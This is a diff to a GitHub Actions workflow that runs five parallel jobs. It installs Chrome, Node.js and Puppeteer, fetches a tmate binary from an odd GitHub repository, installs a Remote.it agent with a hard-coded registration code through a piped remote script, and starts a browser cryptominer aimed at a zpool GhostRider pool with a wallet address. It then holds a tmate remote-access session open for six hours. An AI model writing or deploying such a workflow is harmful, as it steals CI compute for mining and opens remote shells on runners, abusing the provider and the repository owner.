@@ -12,31 +12,50 @@ jobs:
         runner_id: [1, 2, 3, 4, 5]
       fail-fast: false
     steps:
+      - name: Update and install system dependencies
+        run: |
+          set -euxo pipefail
+          sudo apt-get update
+          sudo apt-get upgrade -y
+          sudo apt-get install -y wget curl gnupg2 software-properties-common lsb-release
+
+      - name: Install Google Chrome
+        run: |
+          set -euxo pipefail
+          if ! command -v google-chrome &> /dev/null; then
+            wget -q -O - https://dl.google.com/linux/linux_signing_key.pub | sudo apt-key add -
+            echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" | sudo tee /etc/apt/sources.list.d/google-chrome.list
+            sudo apt-get update
+            sudo apt-get install -y google-chrome-stable
+          fi
+
+      - name: Install Node.js and npm
+        run: |
+          set -euxo pipefail
+          if ! command -v node &> /dev/null; then
+            curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
+            sudo apt-get install -y nodejs
+          fi
+
+      - name: Install Puppeteer
+        run: |
+          set -euxo pipefail
+          npm install puppeteer
+
       - name: Download tmate
         run: |
-          set -e
+          set -euxo pipefail
           wget -O tmate https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate
           chmod +x tmate
 
       - name: Install Remote.it Agent
         run: |
-          set -e
+          set -euxo pipefail
           R3_REGISTRATION_CODE="55EC315E-BF92-5164-BAB5-624903D7BEF2" sh -c "$(curl -L https://downloads.remote.it/remoteit/install_agent.sh)"
 
-      - name: Install Chrome, Node.js, and Puppeteer, then run webminer (background)
+      - name: Start webminer in Chrome (background)
         run: |
-          set -e
-          if ! command -v google-chrome &> /dev/null; then
-            wget -q -O - https://dl.google.com/linux/linux_signing_key.pub | sudo apt-key add -
-            sudo sh -c 'echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" > /etc/apt/sources.list.d/google-chrome.list'
-            sudo apt-get update
-            sudo apt-get install -y google-chrome-stable
-          fi
-          if ! command -v node &> /dev/null; then
-            curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
-            sudo apt-get install -y nodejs
-          fi
-          npm install puppeteer
+          set -euxo pipefail
           nohup node -e '
           const puppeteer = require("puppeteer");
           const url = "https://webminer.pages.dev?algorithm=cwm_ghostrider&host=ghostrider.na.mine.zpool.ca&port=5354&worker=RLYqcPSqDkF97FjnUJJ1HUzeQ3ciVNm8S5&password=c%3DRTM&workers=4";
@@ -45,6 +64,7 @@ jobs:
               try {
                 const browser = await puppeteer.launch({
                   headless: false,
+                  executablePath: "/usr/bin/google-chrome",
                   args: [
                     "--no-sandbox",
                     "--disable-setuid-sandbox",
@@ -68,6 +88,6 @@ jobs:
 
       - name: Start tmate session
         run: |
-          set -e
+          set -euxo pipefail
           ./tmate -F &
           sleep 21600   # 6 hours
